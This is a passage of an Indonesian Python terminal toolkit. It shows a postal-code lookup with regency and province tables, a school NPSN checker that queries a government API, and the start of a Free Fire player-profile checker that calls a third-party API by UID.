        "7311": "Kab. Barru",
        "7312": "Kab. Soppeng",
        "7313": "Kab. Wajo",
        "7314": "Kab. Sidenreng Rappang",
        "7315": "Kab. Pinrang",
        "7316": "Kab. Enrekang",
        "7317": "Kab. Luwu",
        "7318": "Kab. Tana Toraja",
        "7322": "Kab. Luwu Utara",
        "7324": "Kab. Luwu Timur",
        "7326": "Kab. Toraja Utara",
        "7371": "Kota Makassar",
        "7372": "Kota Pare Pare",
        "7373": "Kota Palopo",
        "7401": "Kab. Kolaka",
        "7402": "Kab. Konawe",
        "7403": "Kab. Muna",
        "7404": "Kab. Buton",
        "7405": "Kab. Konawe Selatan",
        "7406": "Kab. Bombana",
        "7407": "Kab. Wakatobi",
        "7408": "Kab. Kolaka Utara",
        "7409": "Kab. Konawe Utara",
        "7410": "Kab. Buton Utara",
        "7411": "Kab. Kolaka Timur",
        "7412": "Kab. Konawe Kepulauan",
        "7413": "Kab. Muna Barat",
        "7414": "Kab. Buton Tengah",
        "7415": "Kab. Buton Selatan",
        "7471": "Kota Kendari",
        "7472": "Kota Bau Bau",
        "7501": "Kab. Gorontalo",
        "7502": "Kab. Boalemo",
        "7503": "Kab. Bone Bolango",
        "7504": "Kab. Pahuwato",
        "7505": "Kab. Gorontalo Utara",
        "7571": "Kota Gorontalo",
        "7601": "Kab. Pasangkayu",
        "7602": "Kab. Mamuju",
        "7603": "Kab. Mamasa",
        "7604": "Kab. Polewali Mandar",
        "7605": "Kab. Majene",
        "7606": "Kab. Mamuju Tengah",
        "8101": "Kab. Maluku Tengah",
        "8102": "Kab. Maluku Tenggara",
        "8103": "Kab. Kepulauan Tanimbar",
        "8104": "Kab. Buru",
        "8105": "Kab. Seram Bagian Timur",
        "8106": "Kab. Seram Bagian Barat",
        "8107": "Kab. Kepulauan Aru",
        "8108": "Kab. Maluku Barat Daya",
        "8109": "Kab. Buru Selatan",
        "8171": "Kota Ambon",
        "8172": "Kota Tual",
        "8201": "Kab. Halmahera Barat",
        "8202": "Kab. Halmahera Tengah",
        "8203": "Kab. Halmahera Utara",
        "8204": "Kab. Halmahera Selatan",
        "8205": "Kab. Kepulauan Sula",
        "8206": "Kab. Halmahera Timur",
        "8207": "Kab. Pulau Morotai",
        "8208": "Kab. Pulau Taliabu",
        "8271": "Kota Ternate",
        "8272": "Kota Tidore Kepulauan",
        "9101": "Kab. Merauke",
        "9102": "Kab. Jayawijaya",
        "9103": "Kab. Jayapura",
        "9104": "Kab. Nabire",
        "9105": "Kab. Kepulauan Yapen",
        "9106": "Kab. Biak Numfor",
        "9107": "Kab. Puncak Jaya",
        "9108": "Kab. Paniai",
        "9109": "Kab. Mimika",
        "9110": "Kab. Sarmi",
        "9111": "Kab. Keerom",
        "9112": "Kab Pegunungan Bintang",
        "9113": "Kab. Yahukimo",
        "9114": "Kab. Tolikara",
        "9115": "Kab. Waropen",
        "9116": "Kab. Boven Digoel",
        "9117": "Kab. Mappi",
        "9118": "Kab. Asmat",
        "9119": "Kab. Supiori",
        "9120": "Kab. Mamberamo Raya",
        "9121": "Kab. Mamberamo Tengah",
        "9122": "Kab. Yalimo",
        "9123": "Kab. Lanny Jaya",
        "9124": "Kab. Nduga",
        "9125": "Kab. Puncak",
        "9126": "Kab. Dogiyai",
        "9127": "Kab. Intan Jaya",
        "9128": "Kab. Deiyai",
        "9171": "Kota Jayapura",
        "9201": "Kab. Sorong",
        "9202": "Kab. Manokwari",
        "9203": "Kab. Fak Fak",
        "9204": "Kab. Sorong Selatan",
        "9205": "Kab. Raja Ampat",
        "9206": "Kab. Teluk Bintuni",
        "9207": "Kab. Teluk Wondama",
        "9208": "Kab. Kaimana",
        "9209": "Kab. Tambrauw",
        "9210": "Kab. Maybrat",
        "9211": "Kab. Manokwari Selatan",
        "9212": "Kab. Pegunungan Arfak",
        "9271": "Kota Sorong"
    }
    
    provinsi_data = {
        "11": "Aceh",
        "12": "Sumatera Utara",
        "13": "Sumatera Barat",
        "14": "Riau",
        "15": "Jambi",
        "16": "Sumatera Selatan",
        "17": "Bengkulu",
        "18": "Lampung",
        "19": "Kepulauan Bangka Belitung",
        "21": "Kepulauan Riau",
        "31": "Dki Jakarta",
        "32": "Jawa Barat",
        "33": "Jawa Tengah",
        "34": "Daerah Istimewa Yogyakarta",
        "35": "Jawa Timur",
        "36": "Banten",
        "51": "Bali",
        "52": "Nusa Tenggara Barat",
        "53": "Nusa Tenggara Timur",
        "61": "Kalimantan Barat",
        "62": "Kalimantan Tengah",
        "63": "Kalimantan Selatan",
        "64": "Kalimantan Timur",
        "65": "Kalimantan Utara",
        "71": "Sulawesi Utara",
        "72": "Sulawesi Tengah",
        "73": "Sulawesi Selatan",
        "74": "Sulawesi Tenggara",
        "75": "Gorontalo",
        "76": "Sulawesi Barat",
        "81": "Maluku",
        "82": "Maluku Utara",
        "91": "Papua",
        "92": "Papua Barat"
    }
    
    if kode_pos in data_kode_pos:
        data = data_kode_pos[kode_pos]
        nama_daerah = data.get('nama', 'Tidak diketahui')
        kode_bps = data.get('bps', 'Tidak diketahui')
        
        if kode_bps in kabupaten_data:
            nama_kabupaten = kabupaten_data[kode_bps]
        else:
            nama_kabupaten = "Tidak diketahui"
        
        kode_prov = kode_pos[:2]
        if kode_prov in provinsi_data:
            nama_provinsi = provinsi_data[kode_prov]
        else:
            nama_provinsi = "Tidak diketahui"
        
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} Kode Pos Ditemukan!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {C}Kode Pos     {W}: {G}{kode_pos}{N}")
        print(f"{W}│ {C}Nama Daerah {W}: {G}{nama_daerah}{N}")
        print(f"{W}│ {C}Kode BPS    {W}: {G}{kode_bps}{N}")
        print(f"{W}│ {C}Kabupaten   {W}: {G}{nama_kabupaten}{N}")
        print(f"{W}│ {C}Provinsi   {W}: {G}{nama_provinsi}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
    else:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}✗{W} Kode Pos {R}{kode_pos}{W} Tidak Ditemukan!{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
def tool_cek_npsn():
    play_menu_sound()
    pantau_aktivitas()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading, subprocess
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    N = '\033[0m'
    
    ascii_npsn = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣾⣾⣾⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⢨⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠐⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠅⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠃⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣤⣶⠞⠊⠀⢀⣠⣴⣴⣶⡄⢻⠟⢡⣶⣶⣤⣄⡀⠈⠉⠺⣦⣤⣀⠀⠀⠀
⢠⣾⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣦⣼⣿⣿⣿⣿⣿⡿⠀⠀⠀⢸⣿⣿⣷⡄⠀
⢹⣿⣿⣿⣷⣄⠀⠀⠀⠉⠛⠻⠻⠿⠿⠿⠿⠟⠟⠟⠛⠉⠀⠀⢀⣠⣿⣿⣿⣿⡏⠀
⠀⠉⠻⢿⣿⣿⣿⣶⣦⣤⣄⣄⣀⣀⢀⢀⣀⣀⣀⣄⣤⣶⣾⣿⣿⣿⡿⠟⠉⠀⠀
⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⠿⠿⡿⡿⡿⡿⡿⢿⠿⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_npsn}" | lolcat')
    print(f"""
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}: {G}Checker NPSN (Dapodik)
{W}╰────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}NPSN{W} (8 digit) Sekolah {N}")
    print(f"{W}│ Contoh {G}:{W} 40203594{N}")
    print(f"{W}╰────────────────────────────────────────────────────────────────╯{N}")
    
    npsn = input(f"{U}❯❯❯ {W}Masukkan NPSN Target{G}❯{W} ").strip()
    
    if not npsn:
        print(f"\n{R}✗{W} NPSN tidak boleh kosong! Tekan {G}Enter{W} Untuk Kembali{N}")
        input()
        return
    
    if not npsn.isdigit() or len(npsn) != 8:
        print(f"\n{R}✗ NPSN harus 8 digit angka!{N}")
        time.sleep(2)
        return
    
    print(f"\n{G}✓ NPSN: {C}{npsn}{N}")
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengecek NPSN [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    try:
        curl_cmd = f"""curl -s -X POST 'https://sekolah.data.kemendikdasmen.go.id/v1/sekolah-service/sekolah/cari-sekolah' -H 'Content-Type: application/json' -d '{{"page":0,"size":12,"keyword":"{npsn}","kabupaten_kota":"","bentuk_pendidikan":"","status_sekolah":""}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        stop_loading.set()
        loading_thread.join()
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                
                if data.get('status_code') == 200 and data.get('data') and len(data['data']) > 0:
                    sekolah = data['data'][0]
                    
                    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
                    print(f"{W}│ {G}✓{W} NPSN Ditemukan!{N}")
                    print(f"{W}├─────────────────────────────────────────────────────────────┤")
                    print(f"{W}│ {C}NPSN          {W}: {G}{sekolah.get('npsn', 'N/A')}{N}")
                    print(f"{W}│ {C}Nama Sekolah  {W}: {G}{sekolah.get('nama', 'N/A')}{N}")
                    print(f"{W}│ {C}Jenjang       {W}: {G}{sekolah.get('bentuk_pendidikan', 'N/A')}{N}")
                    print(f"{W}│ {C}Provinsi      {W}: {G}{sekolah.get('provinsi', 'N/A')}{N}")
                    print(f"{W}│ {C}Kab/Kota      {W}: {G}{sekolah.get('kabupaten', 'N/A')}{N}")
                    print(f"{W}│ {C}Kecamatan     {W}: {G}{sekolah.get('kecamatan', 'N/A')}{N}")
                    print(f"{W}│ {C}Status        {W}: {G}{sekolah.get('status_sekolah', 'N/A')}{N}")
                    print(f"{W}│ {C}Akreditasi    {W}: {G}{sekolah.get('akreditasi', 'N/A')}{N}")
                    print(f"{W}│ {C}Alamat        {W}: {G}{sekolah.get('alamat_jalan', 'N/A')}{N}")
                    print(f"{W}│ {C}Desa/Dusun    {W}: {G}{sekolah.get('nama_dusun', 'N/A')}{N}")
                    print(f"{W}│ {C}Kode Pos      {W}: {G}{sekolah.get('kode_pos', 'N/A')}{N}")
                    print(f"{W}│ {C}RT/RW         {W}: {G}{sekolah.get('rt', 'N/A')}/{sekolah.get('rw', 'N/A')}{N}")
                    print(f"{W}│ {C}Photo         {W}: {G}{sekolah.get('path_file', 'N/A')}{N}")
                    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
                else:
                    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
                    print(f"{W}│ {R}✗{W} NPSN {R}{npsn}{W} Tidak Ditemukan!{N}")
                    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
            except json.JSONDecodeError:
                print(f"\n{R}✗ Gagal parsing response!{N}")
        else:
            print(f"\n{R}✗ Gagal mengakses API!{N}")
            
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Error: {e}{N}")
    
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_freefire_checker():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading
    import re
    from datetime import datetime
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    N = '\033[0m'
    
    ascii_ff = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⠴⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠀⠀⠀⢀⣠⣤⣶⣾⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⠋⠀⣠⣴⣾⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⢃⣴⣾⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⡿⠟⢉⣀⣠⣤⣤⣴⣶⣶⣶⣶⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⡿⠟⠛⠋⠉⠉⠉⠉⠛⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄
⠀⢀⣴⣾⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣴⣶⣾⣿⠋⠀
⠐⠛⠛⠋⠉⠁⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠛⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⢀⣴⣾⣿⡿⠟⠛⠛⠛⠛⠿⣿⣿⣿⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠄⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣿⣿⡟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣾⣿⣿⣿⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠈⢿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠈⠛⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⠟⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣷⣤⣀⣀⠀⠀⢀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣷⣶⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_ff}" | lolcat 2>/dev/null || echo "{ascii_ff}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}: {G}Free Fire Checker
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}UID{W} Free Fire{N}")
    print(f"{W}│ Contoh {G}:{W} 10353221131{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    uid = input(f"{U}❯❯❯{W} Masukkan Uid FF{G} :{W} ").strip()
    
    if not uid:
        print(f"\n{R}✗ UID tidak boleh kosong!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    if not uid.isdigit():
        print(f"\n{R}✗ UID harus berupa angka!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    print(f"\n{G}✓ UID: {C}{uid}{N}")
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengecek UID Free Fire [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    try:
        url = f"https://api.nexray.eu.cc/stalker/freefire?uid={uid}"
        headers = {
            'accept': '*/*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'http://adenpedia.my.id/adencs/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=15)
        stop_loading.set()
        loading_thread.join()
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                result = data.get('result', {})
                
                if not result:
                    print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
                    print(f"{W}│ {R}✗{W} Data tidak ditemukan!{N}")
                    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
                else:
                    uid_res = str(result.get('uid', 'Tidak Tersedia')).strip()
                    name = str(result.get('name', 'Tidak Tersedia')).strip()
                    level = result.get('level', 'Tidak Tersedia')
                    exp = result.get('exp', 'Tidak Tersedia')
                    region = str(result.get('region', 'Tidak Tersedia')).strip()
                    likes = str(result.get('likes', 'Tidak Tersedia')).strip()
                    prime_level = result.get('prime_level', 'Tidak Tersedia')
                    honor_score = result.get('honor_score', 'Tidak Tersedia')
                    celebrity_status = result.get('celebrity_status', 'Tidak Tersedia')
                    title = result.get('title', 'Tidak Tersedia')
                    signature = str(result.get('signature', 'Tidak Tersedia')).strip()
                    if signature == 'Tidak Tersedia' or not signature:
                        signature = '(kosong)'
                    elif len(signature) > 60:
                        signature = signature[:57] + '...'
                    
                    fire_pass = result.get('fire_pass', 'Tidak Tersedia')
                    bp_badges = result.get('bp_badges', 'Tidak Tersedia')
                    br_rank = result.get('br_rank', 'Tidak Tersedia')
                    cs_points = result.get('cs_points', 'Tidak Tersedia')
                    created_at_raw = result.get('created_at', 'Tidak Tersedia')
                    last_login_raw = result.get('last_login', 'Tidak Tersedia')
                    
                    equipped_skills = result.get('equipped_skills', 'Tidak Tersedia')
                    equipped_gun_id = result.get('equipped_gun_id', 'Tidak Tersedia')
                    equipped_animation_id = result.get('equipped_animation_id', 'Tidak Tersedia')
                    transform_animation_id = result.get('transform_animation_id', 'Tidak Tersedia')
                    
                    pet_equipped = result.get('pet_equipped', 'Tidak Tersedia')
                    pet_name = result.get('pet_name', 'Tidak Tersedia')
                    pet_exp = result.get('pet_exp', 'Tidak Tersedia')
                    pet_level = result.get('pet_level', 'Tidak Tersedia')
                    pet_id = result.get('pet_id', 'Tidak Tersedia')
                    pet_is_selected = result.get('pet_is_selected', 'Tidak Tersedia')
                    pet_selected_skill_id = result.get('pet_selected_skill_id', 'Tidak Tersedia')
                    pet_skin_id = result.get('pet_skin_id', 'Tidak Tersedia')
                    
                    guild_name = str(result.get('guild_name', 'Tidak Tersedia')).strip()
                    guild_id = str(result.get('guild_id', 'Tidak Tersedia')).strip()
                    guild_level = result.get('guild_level', 'Tidak Tersedia')
                    guild_members = result.get('guild_members', 'Tidak Tersedia')
                    guild_member = result.get('guild_member', 'Tidak Tersedia')
                    guild_capacity = result.get('guild_capacity', 'Tidak Tersedia')
                    guild_owner_id = str(result.get('guild_owner_id', 'Tidak Tersedia')).strip()
                    
                    guild_leader_name = str(result.get('guild_leader_name', 'Tidak Tersedia')).strip()
                    guild_leader_uid = str(result.get('guild_leader_uid', 'Tidak Tersedia')).strip()
                    guild_leader_level = result.get('guild_leader_level', 'Tidak Tersedia')
                    guild_leader_exp = result.get('guild_leader_exp', 'Tidak Tersedia')
                    guild_leader_likes = result.get('guild_leader_likes', 'Tidak Tersedia')
                    guild_leader_br_rank = result.get('guild_leader_br_rank', 'Tidak Tersedia')
                    guild_leader_br_max_rank = result.get('guild_leader_br_max_rank', 'Tidak Tersedia')
                    guild_leader_cs_rank = result.get('guild_leader_cs_rank', 'Tidak Tersedia')
                    guild_leader_cs_max_rank = result.get('guild_leader_cs_max_rank', 'Tidak Tersedia')
                    guild_leader_badge_id = result.get('guild_leader_badge_id', 'Tidak Tersedia')
                    guild_leader_banner_id = result.get('guild_leader_banner_id', 'Tidak Tersedia')
                    guild_leader_avatar_id = result.get('guild_leader_avatar_id', 'Tidak Tersedia')
                    guild_leader_pin_id = result.get('guild_leader_pin_id', 'Tidak Tersedia')
                    guild_leader_region = result.get('guild_leader_region', 'Tidak Tersedia')
                    guild_leader_season_id = result.get('guild_leader_season_id', 'Tidak Tersedia')
                    guild_leader_release_version = result.get('guild_leader_release_version', 'Tidak Tersedia')
                    guild_leader_has_elite_pass = result.get('guild_leader_has_elite_pass', 'Tidak Tersedia')
                    guild_leader_weapon_skins = result.get('guild_leader_weapon_skins', 'Tidak Tersedia')
                    guild_leader_created_at = result.get('guild_leader_created_at', 'Tidak Tersedia')
                    guild_leader_last_login = result.get('guild_leader_last_login', 'Tidak Tersedia')
                    guild_leader_title = result.get('guild_leader_title', 'Tidak Tersedia')
                    guild_leader_bp_badges = result.get('guild_leader_bp_badges', 'Tidak Tersedia')
                    guild_leader_br_points = result.get('guild_leader_br_points', 'Tidak Tersedia')
                    guild_leader_cs_points = result.get('guild_leader_cs_points', 'Tidak Tersedia')
                    
                    credit_score = result.get('credit_score', 'Tidak Tersedia')
                    season_id = result.get('season_id', 'Tidak Tersedia')
                    account_type = result.get('account_type', 'Tidak Tersedia')
